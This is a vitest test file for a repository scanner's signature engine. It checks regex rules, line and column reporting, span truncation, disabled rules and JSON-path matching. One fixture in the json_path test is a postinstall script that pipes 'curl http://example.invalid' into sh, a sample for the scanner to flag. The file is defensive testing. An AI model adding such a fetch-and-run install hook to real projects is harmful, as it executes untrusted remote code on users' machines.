import { describe, it, expect } from 'vitest';
import { runSignatures } from '../scanner/signature-engine.js';
import { normalize } from '../normalizer.js';
import type { RepoFile } from '../types.js';
import type { VirusDefinition } from '../definitions/schema.js';

function makeFile(rel: string, role: RepoFile['role'] = 'docs'): RepoFile {
  return { path: `/repo/${rel}`, rel, role, sizeBytes: 100 };
}

function makeDef(overrides: Partial<VirusDefinition> = {}): VirusDefinition {
  return {
    id:         'EX-999',
    title:      'Test rule',
    severity:   'high',
    applies_to: ['docs'],
    match:      { regex: 'TESTPATTERN' },
    owasp:      ['LLM01'],
    fix:        'Fix it.',
    enabled:    true,
    ...overrides,
  };
}

describe('runSignatures — regex', () => {
  it('a matching regex rule produces a finding', () => {
    const file = makeFile('README.md', 'docs');
    const norm = normalize('some TESTPATTERN here', 'docs');
    const findings = runSignatures(file, norm, [makeDef()]);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.ruleId).toBe('EX-999');
    expect(findings[0]?.source).toBe('signature');
  });

  it('a non-matching regex returns no findings', () => {
    const file = makeFile('README.md', 'docs');
    const norm = normalize('nothing interesting here', 'docs');
    expect(runSignatures(file, norm, [makeDef()])).toHaveLength(0);
  });

  it('line and col are computed correctly', () => {
    const file = makeFile('README.md', 'docs');
    const norm = normalize('line1\nline2 TESTPATTERN end', 'docs');
    const findings = runSignatures(file, norm, [makeDef()]);
    expect(findings[0]?.line).toBe(2);
    expect(findings[0]?.col).toBeGreaterThan(0);
  });

  it('span is capped at 120 chars with ellipsis', () => {
    const longMatch = 'T'.repeat(200);
    const file = makeFile('README.md', 'docs');
    const norm = normalize(longMatch, 'docs');
    const def  = makeDef({ id: 'EX-995', match: { regex: 'T{10,}' } });
    const findings = runSignatures(file, norm, [def]);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.span.length).toBeLessThanOrEqual(121); // 120 + '…'
    expect(findings[0]?.span.endsWith('…')).toBe(true);
  });
});

describe('runSignatures — disabled / applies_to', () => {
  it('a disabled rule never fires', () => {
    const file = makeFile('README.md', 'docs');
    const norm = normalize('TESTPATTERN', 'docs');
    const def  = makeDef({ enabled: false });
    expect(runSignatures(file, norm, [def])).toHaveLength(0);
  });

  it('a rule with applies_to: docs does not fire on a manifest file', () => {
    const file = makeFile('package.json', 'manifest');
    const norm = normalize('TESTPATTERN', 'manifest');
    expect(runSignatures(file, norm, [makeDef()])).toHaveLength(0);
  });
});

describe('runSignatures — json_path', () => {
  it('fires on a matching JSON path', () => {
    const file = makeFile('config.json', 'config');
    const json = JSON.stringify({ scripts: { postinstall: 'curl http://example.invalid | sh' } });
    const norm = normalize(json, 'config');
    const def  = makeDef({
      applies_to: ['config', 'manifest'],
      match: { json_path: '$.scripts.postinstall' },
    });
    const findings = runSignatures(file, norm, [def]);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.span).toContain('curl');
  });

  it('silently skips non-JSON files for json_path rules', () => {
    const file = makeFile('README.md', 'docs');
    const norm = normalize('not json at all', 'docs');
    const def  = makeDef({ applies_to: ['docs'], match: { json_path: '$.foo' } });
    expect(runSignatures(file, norm, [def])).toHaveLength(0);
  });
});
